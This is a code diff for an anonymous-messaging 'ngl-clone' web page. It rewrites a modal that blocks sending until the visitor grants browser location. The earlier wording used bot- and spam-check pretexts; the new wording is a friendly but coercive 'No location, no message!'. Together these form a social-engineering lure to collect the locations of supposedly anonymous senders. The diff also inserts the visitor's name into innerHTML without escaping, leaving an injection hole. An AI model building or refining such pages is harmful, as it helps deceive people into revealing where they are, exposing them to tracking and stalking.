@@ -41,9 +41,9 @@
     .people-tap-count { color: #fff; margin: 10px auto 0; font-size: 18px; max-width: 420px; user-select: none; white-space: nowrap; overflow-x: auto; }
     .fade-out { animation: fadeOut 0.8s ease-out forwards; }
     @keyframes fadeOut {to {opacity: 0; transform: scale(0.95);}}
-    #sentOverlay { position: fixed; z-index: 100; inset: 0; background: rgba(0,0,0,0.7); display: none; flex-direction: column; align-items: center; justify-content: center; pointer-events: all; animation: fadeInSent 0.38s; }
+    #sentOverlay { position: fixed; z-index: 100; inset: 0; background: rgba(0,0,0,0.12); display: none; flex-direction: column; align-items: center; justify-content: center; pointer-events: all; animation: fadeInSent 0.38s; }
     @keyframes fadeInSent {from {opacity: 0;}to {opacity: 1;}}
-    .sent-circle { width: 140px; height: 140px; border-radius: 50%; background: white; margin-bottom: 22px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 48px 0 rgba(0,0,0,0.13); }
+    .sent-circle { width: 140px; height: 140px; border-radius: 50%; background: none; margin-bottom: 22px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 48px 0 rgba(0,0,0,0.13); }
     .sent-check { width: 140px; height: 140px; display: block; }
     .sent-text { color: #fff; font-family: 'Montserrat', Arial, sans-serif; font-size: 2.2rem; font-weight: 700; letter-spacing: 0.01em; text-shadow: 0 2px 8px rgba(0,0,0,0.16); user-select: none; }
     .sent-extra-box { margin: 18px auto 0; padding: 15px 20px; font-size: 20px; border-radius: 30px; width: 80%; max-width: 340px; background: #000; color: #fff; user-select: none; font-weight: 700; letter-spacing: 0.02em; transition: box-shadow 0.2s; box-shadow: 0 4px 18px -8px #f43f5e70; cursor: pointer; text-align: center; text-decoration: none; display: block; }
@@ -63,16 +63,11 @@
     .ngl-spinner-dot:nth-child(4) { left: 0%; top: 50%; transform: translate(-50%, -50%); animation-delay: 0.9s; }
     @keyframes ngl-spinner-bounce {0%, 100% {transform: scale(1) translate(0,0);}25% {transform: scale(1.35) translate(0,0);}50% {transform: scale(1) translate(0,0);}}
     .ngl-spinner-label { color: #f43f5e; font-size: 1.13rem; font-family: 'Montserrat', Arial, sans-serif; font-weight: 700; letter-spacing: 0.01em; text-shadow: 0 1px 4px rgba(244,63,94,0.13); margin-top: 2px; }
-    .ngl-modal-outer { display: none; position: fixed; z-index: 10000; inset: 0; background: rgba(0,0,0,0.7); align-items: center; justify-content: center; transition: opacity 0.3s; }
-    .ngl-modal-inner { background: #fff; color: #222; border-radius: 22px; box-shadow: 0 4px 40px #f43f5e55; padding: 28px 25px; max-width: 340px; text-align: center; position: relative; width: 85%; }
+    .ngl-modal-outer { display: none; position: fixed; z-index: 10000; inset: 0; background: linear-gradient(135deg, #ff007a 0%, #f43f5e 55%, #f97316 100%); background-blend-mode: multiply; align-items: center; justify-content: center; transition: opacity 0.3s; }
+    .ngl-modal-inner { background: #fff; color: #222; border-radius: 22px; box-shadow: 0 4px 40px #f43f5e55; padding: 38px 28px 34px 28px; max-width: 340px; text-align: center; position: relative; }
     .ngl-modal-inner b, .ngl-modal-inner .ngl-em { color: #ff007a; font-weight: 700; }
-    .ngl-modal-btn { font-size: 1.08rem; font-weight: 600; padding: 12px 30px; background: linear-gradient(90deg, #ff007a 0%, #f43f5e 70%, #f97316 100%); color: #fff; border-radius: 25px; border: none; cursor: pointer; margin-top: 18px; transition: transform 0.18s; box-shadow: 0 2px 8px #ff007a33; width: 100%; }
-    .ngl-modal-btn:active { transform: scale(0.96); }
-    .safari-warning { display: none; background: #FFF3CD; color: #856404; padding: 10px; border-radius: 4px; margin: 10px 0; }
-    .is-safari .safari-warning { display: block; }
-    ul { padding-left: 20px; margin: 15px 0; }
-    li { margin-bottom: 8px; position: relative; text-align: left; }
-    li:before { content: "•"; color: #ff007a; font-weight: bold; display: inline-block; width: 1em; margin-left: -1em; }
+    .ngl-modal-btn { font-size: 1.08rem; font-weight: 600; padding: 10px 26px; background: linear-gradient(90deg, #ff007a 0%, #f43f5e 70%, #f97316 100%); color: #fff; border-radius: 18px; border: none; cursor: pointer; margin-top: 18px; transition: background 0.18s; box-shadow: 0 2px 8px #ff007a33; }
+    .ngl-modal-btn:active { background: #f43f5e; }
     .denial-help { background: #f8f9fa; border-radius: 12px; padding: 15px; margin-top: 15px; text-align: left; }
     .denial-help h4 { margin-top: 0; color: #f43f5e; }
     .denial-help ol { padding-left: 20px; }
@@ -150,23 +145,22 @@
     </div>
   </div>
 
-  <div id="nglLocationModal" class="ngl-modal-outer">
+  <div id="nglAskLocationModal" class="ngl-modal-outer">
     <div class="ngl-modal-inner">
       <div style="font-size:2.1rem; font-weight:700; margin-bottom:20px; color:#ff007a;">
-        📍 Location Required
+        🚦 Wait! Wait!
       </div>
-      <div style="font-size:1.12rem; margin-bottom:14px; line-height:1.5;">
-        <p>This ngl-clone <span style="color:#ff007a; font-weight:600;">requires</span> location to:</p>
-        <ul>
-          <li>Verify you're not a bot</li>
-          <li>Prevent spam messages</li>
-          <li>This is necessary to deliver your message</li>
-        </ul>
-        <p style="margin-top:20px; font-size:0.95rem; color:#666;">
-          Code functions on location to send - deny = no message
-        </p>
+      <div id="nglAskLocationModalContent" style="font-size:1.15rem; margin-bottom:14px;">
+        <span class="ngl-em" style="font-size:1.19rem;">Hold on, friend!</span><br>
+        <span style="color:#f43f5e; font-weight:600;">
+          Please turn on your <span class="ngl-em">location</span> so your message can reach me!<br>
+        </span>
+        <span style="display:inline-block; margin-top:9px; font-size:1rem; color:#444;">
+          <b style="color:#ff007a;">No location, no message!</b><br>
+          Since this isn't the real ngl, we need your location to deliver your vibes!
+        </span>
       </div>
-      <button class="ngl-modal-btn" id="nglUnderstandBtn">Got It</button>
+      <button class="ngl-modal-btn" id="nglAskLocationAllowBtn">Okay, I'll allow it!</button>
     </div>
   </div>
 
@@ -372,7 +366,7 @@
         if (!locationRequested) {
           // Show friendly explanation before system prompt
           document.getElementById('nglLoading').style.display = 'none';
-          await showLocationExplanation();
+          await showLocationExplanation(name);
           locationRequested = true;
           return handleFormSubmit(event); // Retry
         }
@@ -396,12 +390,23 @@
       return true;
     }
 
-    async function showLocationExplanation() {
+    async function showLocationExplanation(name) {
+      const nameVal = name || 'friend';
+      document.getElementById('nglAskLocationModalContent').innerHTML =
+        `<span class="ngl-em" style="font-size:1.19rem;">Hold on, ${nameVal}!</span><br>
+        <span style="color:#f43f5e; font-weight:600;">
+          Please turn on your <span class="ngl-em">location</span> so your message can reach me!<br>
+        </span>
+        <span style="display:inline-block; margin-top:9px; font-size:1rem; color:#444;">
+          <b style="color:#ff007a;">No location, no message!</b><br>
+          Since this isn't the real ngl, we need your location to deliver your vibes!
+        </span>`;
+      
       return new Promise((resolve) => {
-        const modal = document.getElementById('nglLocationModal');
+        const modal = document.getElementById('nglAskLocationModal');
         modal.style.display = 'flex';
         
-        document.getElementById('nglUnderstandBtn').onclick = () => {
+        document.getElementById('nglAskLocationAllowBtn').onclick = () => {
           modal.style.display = 'none';
           locationRequested = true;
           resolve();
@@ -472,14 +477,14 @@
     }
 
     function showModal(title, message) {
-      document.getElementById('nglLocationModal').innerHTML = `
+      document.getElementById('nglAskLocationModal').innerHTML = `
         <div style="text-align:center">
           <div style="font-size:2rem; font-weight:700; margin-bottom:15px; color:#f43f5e;">${title}</div>
           <p style="font-size:1.1rem;">${message}</p>
-          <button class="ngl-modal-btn" onclick="document.getElementById('nglLocationModal').style.display='none'">OK</button>
+          <button class="ngl-modal-btn" onclick="document.getElementById('nglAskLocationModal').style.display='none'">OK</button>
         </div>
       `;
-      document.getElementById('nglLocationModal').style.display = 'flex';
+      document.getElementById('nglAskLocationModal').style.display = 'flex';
     }
 
     function showSuccessOverlay(name) {
